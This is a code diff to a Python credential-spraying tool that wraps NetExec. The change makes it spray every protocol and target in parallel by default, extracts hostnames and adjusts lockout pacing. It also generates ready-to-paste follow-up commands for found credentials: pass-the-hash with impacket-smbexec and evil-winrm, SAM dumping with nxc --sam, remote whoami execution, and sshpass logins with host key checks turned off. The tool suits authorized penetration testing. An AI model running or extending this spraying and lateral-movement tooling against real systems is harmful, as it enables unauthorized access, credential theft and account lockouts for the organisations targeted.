@@ -56,7 +56,8 @@ PWN3D_MEANING = {
 
 DEFAULT_LOCKOUT = 3
 DEFAULT_LOCKOUT_DELAY = 60
-DEFAULT_THREADS = 5
+# 0 = one worker per (protocol, target) lane -- all services on all boxes at once.
+DEFAULT_THREADS = 0
 
 ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]|\x1b\][^\x07]*\x07|\x1b\([AB0]")
 HEX32 = re.compile(r"^[0-9a-fA-F]{32}$")
@@ -184,6 +185,22 @@ def auth_mode_of(protocol: str, extra_args: list[str], label: str = "") -> str:
     return ""
 
 
+# Console METHOD column: D=domain, L=local, M=mssql. Windows MSSQL auth is D.
+METHOD_LETTER = {
+    "domain": "D",
+    "local": "L",
+    "windows": "D",
+    "mssql": "M",
+    "internal": "M",
+}
+
+
+def method_letter(mode: str) -> str:
+    if not mode:
+        return "-"
+    return METHOD_LETTER.get(mode, "-")
+
+
 @dataclass
 class Hit:
     protocol: str
@@ -195,6 +212,7 @@ class Hit:
     extra_args: list[str] = field(default_factory=list)
     label: str = ""
     auth_mode: str = ""
+    hostname: str = ""
 
     def __post_init__(self) -> None:
         if not self.auth_mode:
@@ -211,11 +229,13 @@ class Hit:
         return {
             "protocol": self.protocol,
             "target": self.target,
+            "hostname": self.hostname or None,
             "user": self.cred.username,
             "pass": self.cred.password if not self.cred.secret_is_hash else None,
             "hash": self.cred.ntlm_hash,
             "status": self.status,
             "auth_mode": self.auth_mode or None,
+            "method": method_letter(self.auth_mode),
             "timestamp": self.timestamp,
         }
 
@@ -756,6 +776,52 @@ def _status_from_line(line: str) -> str:
     return "valid"
 
 
+# nxc table: PROTO  IP  PORT  HOSTNAME  [+]/[-]/[*] message
+NXC_ROW_RE = re.compile(
+    r"^(?:SMB|WINRM|RDP|SSH|FTP|LDAP|MSSQL|VNC|WMI)\s+"
+    r"\S+\s+"
+    r"\d+\s+"
+    r"(?P<hostname>\S+)\s+"
+    r"\[",
+    re.I,
+)
+NXC_NAME_RE = re.compile(r"\(name:([^)]+)\)", re.I)
+
+
+def _looks_like_hostname(value: str) -> bool:
+    if not value or value in {"[+]", "[-]", "[*]", "-", "*"}:
+        return False
+    if value.upper().startswith("SSH-"):
+        return False
+    if value.lower().startswith("windows"):
+        return False
+    if value.startswith("(") or "/" in value:
+        return False
+    return True
+
+
+def extract_hostname(stdout: str) -> str:
+    """Best-effort hostname from nxc stdout: (name:X) then the HOSTNAME column."""
+    text = strip_ansi(stdout or "")
+    from_name = ""
+    from_col = ""
+    for raw in text.splitlines():
+        line = raw.strip()
+        if not line:
+            continue
+        m = NXC_NAME_RE.search(line)
+        if m:
+            name = m.group(1).strip()
+            if name:
+                from_name = name
+        row = NXC_ROW_RE.match(line)
+        if row:
+            host = row.group("hostname").strip()
+            if _looks_like_hostname(host):
+                from_col = host
+    return from_name or from_col
+
+
 def parse_nxc_output(
     stdout: str,
     protocol: str,
@@ -770,6 +836,7 @@ def parse_nxc_output(
     locked = False
     best: Optional[Hit] = None
     extra = list(extra_args or [])
+    hostname = extract_hostname(text)
 
     for raw_line in text.splitlines():
         line = raw_line.strip()
@@ -805,6 +872,7 @@ def parse_nxc_output(
             line=line,
             extra_args=list(extra),
             label=label,
+            hostname=hostname,
         )
         if best is None or STATUS_RANK.get(status, 1) > STATUS_RANK.get(best.status, 1):
             best = hit
@@ -879,42 +947,45 @@ class LockoutTracker:
             )
 
     def enter(self, target: str, cred: Credential) -> bool:
+        """Reserve this unique cred for (target, domain). Does not hold a lock during nxc.
+
+        Same password across protocols counts once. New unique creds at the
+        threshold pause; already-seen creds (other protocols) are not blocked.
+        """
         if self.threshold <= 0:
             return not self.should_skip(target, cred)
-        if self.should_skip(target, cred):
-            return False
 
         key = self.domain_key(target, cred)
         klock = self.key_lock(key)
-        klock.acquire()
-        try:
+        cred_id = cred.display
+
+        while True:
             if self.should_skip(target, cred):
-                klock.release()
                 return False
-            count = self.counts.get(key, 0)
-            seen = self.attempted.setdefault(key, set())
-            cred_id = cred.display
-            if cred_id not in seen:
-                if count >= self.threshold:
-                    if not self._pause(target, count):
-                        klock.release()
-                        return False
-                    self.counts[key] = 0
-                    seen.clear()
-                seen.add(cred_id)
-                self.counts[key] = self.counts.get(key, 0) + 1
-            return True
-        except Exception:
-            klock.release()
-            raise
+            pause_count: Optional[int] = None
+            with klock:
+                if self.should_skip(target, cred):
+                    return False
+                seen = self.attempted.setdefault(key, set())
+                if cred_id in seen:
+                    return True
+                count = self.counts.get(key, 0)
+                if count < self.threshold:
+                    seen.add(cred_id)
+                    self.counts[key] = count + 1
+                    return True
+                pause_count = count
+            if pause_count is None:
+                return False
+            if not self._pause(target, pause_count):
+                return False
+            with klock:
+                self.counts[key] = 0
+                self.attempted.setdefault(key, set()).clear()
 
     def leave(self, target: str, cred: Credential) -> None:
-        if self.threshold <= 0:
-            return
-        key = self.domain_key(target, cred)
-        klock = self.key_lock(key)
-        if klock.locked():
-            klock.release()
+        # Count is updated in enter(); nothing to release during nxc.
+        return
 
     def _pause(self, target: str, count: int) -> bool:
         if self.shutdown.is_set() or target in self.aborted_targets:
@@ -1117,6 +1188,24 @@ def hit_has_exec(hit: Hit) -> bool:
     return "pwn3d" in low or "shell" in low
 
 
+def _impacket_spec(cred: Credential, target: str, local: bool) -> tuple[str, str]:
+    """Return (quoted host spec, extra flags) for impacket-smbexec."""
+    user = cred.username or ""
+    if local:
+        auth = f"./{user}" if user else "./"
+    elif cred.domain and "\\" not in cred.username:
+        auth = f"{cred.domain}/{user}"
+    else:
+        auth = user
+    if cred.secret_is_hash:
+        h = cred.ntlm_hash or ""
+        if ":" not in h:
+            h = f":{h}"
+        return sh_quote(f"{auth}@{target}"), f" -hashes {h}"
+    pw = cred.password or ""
+    return sh_quote(f"{auth}:{pw}@{target}"), ""
+
+
 def _rdp_pastable(hit: Hit) -> str:
     cred = hit.cred
     t = hit.target
@@ -1143,7 +1232,6 @@ def pastables_for_hit(hit: Hit) -> list[str]:
     nxc_auth, kind = _auth_flags(cred, local=local)
     u = cred.username or "''"
     p = sh_quote(cred.password or "")
-    h = cred.ntlm_hash or ""
     nth = cred.nt_hash_only()
     lines: list[str] = []
 
@@ -1161,25 +1249,34 @@ def pastables_for_hit(hit: Hit) -> list[str]:
             )
         )
         if can_exec:
+            spec, extra = _impacket_spec(cred, t, local)
             lines.append(_nxc_cmd("smb", t, nxc_auth, local, "--sam"))
-            if kind == "hash":
-                lines.append(f"impacket-secretsdump {cred.username}@{t} -hashes {h}")
+            lines.append(_nxc_cmd("smb", t, nxc_auth, local, "-x whoami"))
+            lines.append(f"impacket-smbexec {spec}{extra}")
     elif proto == "winrm":
+        lines.append(_nxc_cmd("winrm", t, nxc_auth, local))
         if can_exec:
+            dflag = ""
+            if not local and cred.domain:
+                dflag = f" -d {_shell_user(cred.domain)}"
             if kind == "hash":
                 lines += [
-                    f"evil-winrm -i {t} -u {u} -H {nth}",
+                    f"evil-winrm -i {t} -u {u} -H {nth}{dflag}",
                     _nxc_cmd("winrm", t, nxc_auth, local, "-x whoami"),
                 ]
             else:
                 lines += [
-                    f"evil-winrm -i {t} -u {u} -p {p}",
+                    f"evil-winrm -i {t} -u {u} -p {p}{dflag}",
                     _nxc_cmd("winrm", t, nxc_auth, local, "-x whoami"),
                 ]
     elif proto == "rdp":
         lines.append(_rdp_pastable(hit))
     elif proto == "ssh":
         if kind != "hash":
+            ssh_user = _shell_user(cred.username or "root")
+            lines.append(
+                f"sshpass -p {p} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password {ssh_user}@{t}"
+            )
             lines += [
                 f"ssh {u}@{t}",
                 _nxc_cmd("ssh", t, nxc_auth, False),
@@ -1197,6 +1294,7 @@ def pastables_for_hit(hit: Hit) -> list[str]:
         if kind != "hash":
             lines.append(_nxc_cmd("vnc", t, nxc_auth, False))
     elif proto == "wmi":
+        lines.append(_nxc_cmd("wmi", t, nxc_auth, local))
         if can_exec:
             lines.append(_nxc_cmd("wmi", t, nxc_auth, local, "-x whoami"))
 
@@ -1227,6 +1325,8 @@ def render_pastables(hits: list[Hit]) -> str:
     for key in order:
         group = groups[key]
         target, cred_disp = key
+        host = next((h.hostname for h in group if h.hostname), "")
+        target_label = f"{target} ({host})" if host else target
         body: list[str] = []
         by_proto: dict[str, list[Hit]] = {}
         proto_order: list[str] = []
@@ -1261,7 +1361,7 @@ def render_pastables(hits: list[Hit]) -> str:
                 body.append("")
         if not body:
             continue
-        blocks.append(f"[{target} | {cred_disp}]")
+        blocks.append(f"[{target_label} | {cred_disp}]")
         blocks.append("")
         blocks.extend(body)
     if not blocks:
@@ -1351,10 +1451,24 @@ def build_jobs(
     return jobs
 
 
+def group_jobs_by_lane(jobs: list[Job]) -> list[tuple[tuple[str, str], list[Job]]]:
+    """One lane per (protocol, target). Creds stay serial inside each lane."""
+    lanes: dict[tuple[str, str], list[Job]] = {}
+    order: list[tuple[str, str]] = []
+    for job in jobs:
+        key = (job.protocol, job.target)
+        if key not in lanes:
+            lanes[key] = []
+            order.append(key)
+        lanes[key].append(job)
+    return [(k, lanes[k]) for k in order]
+
+
 HIT_COL_PROTO = 6
 HIT_COL_TARGET = 16
+HIT_COL_HOST = 16
 HIT_COL_CREDS = 22
-HIT_COL_METHOD = 8
+HIT_COL_METHOD = 6
 
 
 ACCESS_LABEL = {
@@ -1391,19 +1505,26 @@ def format_hit_status(hit: Hit) -> str:
 def hit_column_header() -> str:
     proto = "PROTO".ljust(HIT_COL_PROTO)
     target = "TARGET".ljust(HIT_COL_TARGET)
+    host = "HOSTNAME".ljust(HIT_COL_HOST)
     creds = "CREDS".ljust(HIT_COL_CREDS)
     method = "METHOD".ljust(HIT_COL_METHOD)
-    return f"{C.dim}    {proto} | {target} | {creds} | {method} | ACCESS{C.reset}"
+    return (
+        f"{C.dim}    {proto} | {target} | {host} | {creds} | {method} | ACCESS{C.reset}"
+    )
 
 
 def format_hit_line(hit: Hit) -> str:
     proto = hit.protocol.upper().ljust(HIT_COL_PROTO)
     target = hit.target.ljust(HIT_COL_TARGET)
+    host = (hit.hostname or "-").ljust(HIT_COL_HOST)
     cred = hit.cred.display.ljust(HIT_COL_CREDS)
-    method = (hit.auth_mode or "-").ljust(HIT_COL_METHOD)
+    method = method_letter(hit.auth_mode).ljust(HIT_COL_METHOD)
     status = format_hit_status(hit)
     proto_s = f"{C.yellow}{proto}{C.reset}"
-    return f"{C.green_bold}[+]{C.reset} {proto_s} | {target} | {cred} | {method} | {status}"
+    return (
+        f"{C.green_bold}[+]{C.reset} {proto_s} | {target} | {host} | "
+        f"{cred} | {method} | {status}"
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -1567,7 +1688,10 @@ def build_parser() -> argparse.ArgumentParser:
         metavar="N",
         type=int,
         default=DEFAULT_THREADS,
-        help=f"parallel nxc calls (default: {DEFAULT_THREADS})",
+        help=(
+            "max concurrent protocol×target lanes (default: 0 = all services "
+            "against all targets at once; each lane still runs one cred at a time)"
+        ),
     )
 
     out = p.add_argument_group("output")
@@ -1668,47 +1792,44 @@ def run_spray(
     args: argparse.Namespace,
     lockout: LockoutTracker,
 ) -> list[Hit]:
+    """Run all (protocol, target) lanes at once; one cred at a time per lane.
+
+    SMB on host A, WinRM on host A, and SMB on host B can all fire together.
+    Two creds against SMB on the same box stay serial so that service is not
+    flooded.
+    """
     hits: list[Hit] = []
     hits_lock = threading.Lock()
-    stopped: set[tuple[str, str]] = set()  # (protocol, target)
-    stopped_lock = threading.Lock()
-    proto_locks: dict[tuple[str, str], threading.Lock] = {}
-    proto_locks_guard = threading.Lock()
     done = 0
     done_lock = threading.Lock()
     total = len(jobs)
     limiter = RateLimiter(args.delay)
-    threads = max(1, args.threads)
+    lanes = group_jobs_by_lane(jobs)
+    if args.threads <= 0:
+        workers = max(1, len(lanes))
+    else:
+        workers = max(1, min(args.threads, len(lanes) or 1))
 
-    def _proto_lock(key: tuple[str, str]) -> threading.Lock:
-        with proto_locks_guard:
-            if key not in proto_locks:
-                proto_locks[key] = threading.Lock()
-            return proto_locks[key]
-
-    def worker(job: Job) -> list[Hit]:
+    def bump_progress(job: Job) -> None:
         nonlocal done
-        key = (job.protocol, job.target)
-        plock = _proto_lock(key) if args.stop_on_hit else None
-        if plock is not None:
-            plock.acquire()
-        entered = False
+        with done_lock:
+            done += 1
+            combo = job.combo_label()
+            show_progress(
+                f"{_progress_bar(done, total)} {done}/{total} | "
+                f"{combo} | {job.target} | {job.cred.display}"
+            )
+
+    def run_one(job: Job) -> list[Hit]:
+        if lockout.shutdown.is_set():
+            return []
+        if lockout.should_skip(job.target, job.cred):
+            return []
+        if not lockout.enter(job.target, job.cred):
+            return []
         try:
             if lockout.shutdown.is_set():
                 return []
-            with stopped_lock:
-                if key in stopped:
-                    return []
-            if lockout.should_skip(job.target, job.cred):
-                return []
-            if not lockout.enter(job.target, job.cred):
-                return []
-            entered = True
-            if lockout.shutdown.is_set():
-                return []
-            with stopped_lock:
-                if key in stopped:
-                    return []
             limiter.wait()
             argv = build_nxc_argv(nxc, job)
             combo = job.combo_label()
@@ -1738,40 +1859,43 @@ def run_spray(
             )
             if locked:
                 lockout.mark_locked_out(job.target, job.cred)
-            if found and args.stop_on_hit:
-                with stopped_lock:
-                    stopped.add(key)
             return found
         finally:
-            if entered:
-                lockout.leave(job.target, job.cred)
-            if plock is not None:
-                plock.release()
-            with done_lock:
-                done += 1
-                combo = job.combo_label()
-                show_progress(
-                    f"{_progress_bar(done, total)} {done}/{total} | "
-                    f"{combo} | {job.target} | {job.cred.display}"
-                )
+            lockout.leave(job.target, job.cred)
 
-    with ThreadPoolExecutor(max_workers=threads) as pool:
-        futures = {pool.submit(worker, job): job for job in jobs}
+    def run_lane(lane_jobs: list[Job]) -> None:
+        for i, job in enumerate(lane_jobs):
+            if lockout.shutdown.is_set():
+                bump_progress(job)
+                continue
+            try:
+                found = run_one(job)
+            except Exception as exc:
+                log_write(f"{utc_now()} | worker error: {exc}\n")
+                bump_progress(job)
+                continue
+            if found:
+                with hits_lock:
+                    hits.extend(found)
+                for hit in found:
+                    emit(format_hit_line(hit))
+                if args.stop_on_hit:
+                    bump_progress(job)
+                    for skipped in lane_jobs[i + 1 :]:
+                        bump_progress(skipped)
+                    return
+            bump_progress(job)
+
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = [pool.submit(run_lane, lane_jobs) for _, lane_jobs in lanes]
         try:
             for fut in as_completed(futures):
                 if lockout.shutdown.is_set():
                     break
                 try:
-                    found = fut.result()
+                    fut.result()
                 except Exception as exc:
-                    log_write(f"{utc_now()} | worker error: {exc}\n")
-                    continue
-                if not found:
-                    continue
-                with hits_lock:
-                    hits.extend(found)
-                for hit in found:
-                    emit(format_hit_line(hit))
+                    log_write(f"{utc_now()} | lane error: {exc}\n")
         except KeyboardInterrupt:
             lockout.shutdown.set()
             emit(c_warn("Interrupted -- collecting hits so far"))
@@ -1823,8 +1947,8 @@ def main(argv: Optional[list[str]] = None) -> int:
     if args.H and not (args.u or args.U or args.creds):
         die("-H requires -u or -U")
 
-    if args.threads < 1:
-        die("--threads must be >= 1")
+    if args.threads < 0:
+        die("--threads must be >= 0")
     if args.lockout < 0:
         die("--lockout must be >= 0")
     if args.lockout_delay < 0:
